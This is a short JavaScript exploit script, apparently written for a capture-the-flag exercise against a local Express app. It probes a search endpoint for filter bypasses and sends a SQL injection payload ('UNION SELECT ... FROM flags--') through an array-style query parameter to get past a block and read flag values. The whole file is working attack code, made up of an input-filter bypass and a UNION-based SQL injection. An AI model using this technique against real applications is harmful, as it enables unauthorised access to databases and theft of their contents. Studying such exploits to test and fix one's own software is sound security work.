const bypassSearch = async (payload) => {
    const res = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(payload)}`);
    if (res.status !== 403) {
      console.log(`[SUCCESS SEARCH] Payload: ${payload} | Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        // console.log(`[BLOCKED SEARCH]`);
    }
};

const run = async () => {
    // Array bypass for search query parameters
    // In express, ?q[]=x&q[]=y creates an array
    const res = await fetch(`http://localhost:4000/api/search?q[]=${encodeURIComponent("a' UNION SELECT 1, flag_value FROM flags--")}`);
    console.log(`[ARRAY INJECTION] Status: ${res.status}`);
    console.log(`Response: ${await res.text()}\n`);
};

run();
